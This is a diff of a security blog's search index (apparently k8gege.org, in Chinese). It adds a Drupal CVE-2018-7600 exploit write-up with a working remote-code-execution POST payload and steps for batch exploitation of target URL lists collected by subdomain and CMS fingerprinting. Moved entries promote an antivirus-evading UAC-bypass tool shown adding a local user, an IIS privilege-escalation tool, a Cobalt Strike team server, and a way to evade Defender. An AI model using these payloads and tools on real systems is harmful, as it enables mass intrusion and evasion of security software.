@@ -1311,6 +1311,50 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>〖EXP〗Drupal远程代码执行漏洞复现&amp;Ladon批量利用</title>
+    <url>/p/CVE-2018-7600.html</url>
+    <content><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Drupal是一个开源内容管理系统（CMS），全球超过100万个网站（包括政府，电子零售，企业组织，金融机构等）使用。两周前，Drupal安全团队披露了一个非常关键的漏洞，编号CVE-2018-7600 Drupal对表单请求内容未做严格过滤，因此，这使得攻击者可能将恶意注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/" target="_blank" rel="noopener">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Drupal 6.x</p>
+<p>Drupal 7.x</p>
+<p>Drupal 8.x</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2018-7600/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2018-7600/README.zh-cn.md</a></p>
+<p>漏洞环境</p>
+<p>执行如下命令启动drupal 8.5.0的环境：</p>
+<p>docker-compose up -d</p>
+<p>环境启动后，访问<a href="http://your-ip:8080/将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。" target="_blank" rel="noopener">http://your-ip:8080/将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</a></p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/0.PNG"></p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[<span class="comment">#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用LadonExp.exe生成POC，填写对应字段，具体参数如下</p>
+<p>TargetURL: 目标URL<br>Addurl: /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax<br>Post:   form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</p>
+<p>只需以上3个参数即可，点击BuildExe生成EXE，再点击TestEXE测试，如图所示成功执行ID命令。</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/1.PNG"><br>PS：Payload中的exec也可换成system、passthru或其它PHP函数</p>
+<h3 id="Ladon调用"><a href="#Ladon调用" class="headerlink" title="Ladon调用"></a>Ladon调用</h3><p>生成的POC或EXP可使用Ladon调用，单个URL用法如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon http://192.168.1.8:8080 LadonPoc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/2.PNG"></p>
+<h4 id="批量利用"><a href="#批量利用" class="headerlink" title="批量利用"></a>批量利用</h4><p>由于url不像ip那样可使用IP/24、IP/XX来批量，所以我们可配置url.txt来批量利用EXP。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon url.txt LadonPoc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/3.PNG"></p>
+<h3 id="识别Drupal"><a href="#识别Drupal" class="headerlink" title="识别Drupal"></a>识别Drupal</h3><p>实战时可使用LadonGui的SubDomain来快速获取目标子域名并识别出使用Drupal的域名，再把对应URL放入url.txt，即可使用Ladon批量EXP。</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/Ladn85Subdomain.PNG"></p>
+<p>如果已整理好URL，可使用WhatCMS快速识别</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon url.txt WhatCMS</span><br></pre></td></tr></table></figure>
+
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p>
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.6版本：K8小密圈</p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>CVE-2018-7600</tag>
+        <tag>Drupal</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>〖教程〗LadonGO免杀Win10 Defender</title>
     <url>/p/LadonGo_bypasswin10.html</url>
     <content><![CDATA[<h3 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a>Wiki</h3><p><a href="http://k8gege.org/Ladon/LadonGo.html">http://k8gege.org/Ladon/LadonGo.html</a></p>
@@ -1323,7 +1367,7 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
 
 <h4 id="注释Exchange"><a href="#注释Exchange" class="headerlink" title="注释Exchange"></a>注释Exchange</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    //vul.GetExFQND(Target)</span><br><span class="line">//&#125; <span class="keyword">else</span> <span class="keyword">if</span> ScanType == <span class="string">"CVE-2021-26855"</span> &#123;</span><br><span class="line">    //vul.CheckCVE_2021_26855(Target)</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="http://k8gege.org/k8img/LadonGo/LadonGobypasswin10.PNG"></p>
+<p>注释MS17010后发现，提示杀CVE-2021-26855，所以它也注释掉，注释后再丢进去发现可以正常执行Ladon了<br><img alt data-original="http://k8gege.org/k8img/LadonGo/LadonGobypasswin10.PNG"></p>
 <h3 id="加密免杀"><a href="#加密免杀" class="headerlink" title="加密免杀"></a>加密免杀</h3><p>通过注释掉被杀代码，Ladon立马免杀了，但是我们也丢失了功能，对于很多工具免杀也是一样，急用的话可通过删除功能来解决。但是我们需要那个功能怎么办？那必须得做真正的免杀，而不是单纯的删除功能免杀。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ScanType == <span class="string">"MS17010"</span> &#123;</span><br><span class="line">    //smb.MS17010(Target,3)</span><br></pre></td></tr></table></figure>
 
@@ -1883,8 +1927,8 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all-code-1.7.jar CommonsCollections2 &quot;co
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Exchange</tag>
         <tag>信息收集</tag>
+        <tag>Exchange</tag>
       </tags>
   </entry>
   <entry>
@@ -1909,8 +1953,8 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all-code-1.7.jar CommonsCollections2 &quot;co
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Exchange</tag>
         <tag>信息收集</tag>
+        <tag>Exchange</tag>
       </tags>
   </entry>
   <entry>
@@ -2915,8 +2959,8 @@ window.location.href="http://k8gege.org/Ladon/netsh.html";
         <category>Exp</category>
       </categories>
       <tags>
-        <tag>CVE-2020-17144</tag>
         <tag>MS17010</tag>
+        <tag>CVE-2020-17144</tag>
       </tags>
   </entry>
   <entry>
@@ -2947,8 +2991,8 @@ window.location.href="http://k8gege.org/Ladon/netsh.html";
         <category>Exp</category>
       </categories>
       <tags>
-        <tag>CVE-2020-17144</tag>
         <tag>Exchange</tag>
+        <tag>CVE-2020-17144</tag>
       </tags>
   </entry>
   <entry>
@@ -5420,6 +5464,26 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
+    <title>Cobalt Strike TeamServer For Windows</title>
+    <url>/p/22e5f4a8.html</url>
+    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
+<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
+<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
+<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
+<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
+<p><strong>0x003 下载</strong></p>
+<p>TeamServer.exe</p>
+<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Cobalt Strike</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
     <url>/p/9cffe32c.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
@@ -5446,26 +5510,6 @@ Microsoft Windows 10 for 32-bit Systems 0
         <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
         <tag>Metasploit</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cobalt Strike TeamServer For Windows</title>
-    <url>/p/22e5f4a8.html</url>
-    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
-<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
-<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
-<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
-<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
-<p><strong>0x003 下载</strong></p>
-<p>TeamServer.exe</p>
-<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Cobalt Strike</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
       </tags>
   </entry>
   <entry>
@@ -5891,29 +5935,6 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       </tags>
   </entry>
   <entry>
-    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
-    <url>/p/41e1c61c.html</url>
-    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
-<p>工具: k8uac<br>编译: VC++</p>
-<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
-<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
-<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
-<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
-<p>示例如下:</p>
-<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
-<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>BypassUAC</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit</title>
     <url>/p/19452dd9.html</url>
     <content><![CDATA[<table style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial; width: 567px;">
@@ -6072,6 +6093,29 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
+    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
+    <url>/p/41e1c61c.html</url>
+    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
+<p>工具: k8uac<br>编译: VC++</p>
+<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
+<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
+<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
+<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
+<p>示例如下:</p>
+<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
+<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>BypassUAC</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
     <url>/p/77429fa6.html</url>
     <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
@@ -6144,33 +6188,6 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
       </tags>
   </entry>
   <entry>
-    <title>全版本IIS提权工具iislpe</title>
-    <url>/p/6b9b3afe.html</url>
-    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>IIS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>基于Browser协议探测内网主机</title>
     <url>/p/16b5ff0b.html</url>
     <content><![CDATA[<p>利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图</p>
@@ -6235,8 +6252,8 @@ from pprint import pprint
         <category>工具</category>
         <category>主机发现</category>
         <category>源码</category>
-        <category>内网渗透</category>
         <category>嗅探</category>
+        <category>内网渗透</category>
         <category>信息收集</category>
         <category>编程</category>
         <category>Python</category>
@@ -6245,6 +6262,33 @@ from pprint import pprint
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>全版本IIS提权工具iislpe</title>
+    <url>/p/6b9b3afe.html</url>
+    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
+<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
+<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
+<p><strong>原理:</strong></p>
+<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
+<p><strong>用法:</strong></p>
+<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
+<p>&nbsp; &nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+        <tag>IIS</tag>
       </tags>
   </entry>
 </search>
